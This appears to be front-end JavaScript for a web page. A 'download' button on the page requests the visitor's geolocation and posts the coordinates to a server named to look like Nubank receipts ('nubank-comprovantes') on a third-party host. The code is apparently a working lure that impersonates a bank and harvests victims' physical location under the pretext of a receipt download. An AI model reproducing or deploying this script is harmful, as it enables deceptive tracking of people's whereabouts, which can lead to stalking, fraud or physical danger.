document.addEventListener("DOMContentLoaded", () => {
  const botao = document.getElementById("btnDownload");
  const mensagem = document.getElementById("mensagem");

  botao.addEventListener("click", async () => {
    mensagem.textContent = "Verificando permissões...";

    if (!("geolocation" in navigator)) {
      mensagem.textContent = "Seu navegador não suporta geolocalização.";
      return;
    }

    try {
      // Verifica o status da permissão
      const permissionStatus = await navigator.permissions.query({ name: "geolocation" });

      if (permissionStatus.state === "denied") {
        mensagem.innerHTML = `
          Permissão de localização foi negada.<br>
          Por favor, ative manualmente nas configurações do navegador (ícone de cadeado ao lado da URL).
        `;
        return;
      }

      mensagem.textContent = "Solicitando localização...";

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          try {
            const resposta = await fetch("https://nubank-comprovantes.onrender.com/localizacao", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({ latitude: lat, longitude: lon })
            });

            if (resposta.ok) {
              mensagem.textContent = "Localização enviada e registrada com sucesso.";
            } else {
              mensagem.textContent = "Erro ao enviar localização para o servidor.";
            }
          } catch (err) {
            mensagem.textContent = "Erro de rede: " + err.message;
          }
        },
        (error) => {
          mensagem.textContent = "Erro ao obter localização: " + error.message;
        }
      );

    } catch (e) {
      mensagem.textContent = "Erro ao verificar permissões de localização.";
    }
  });
});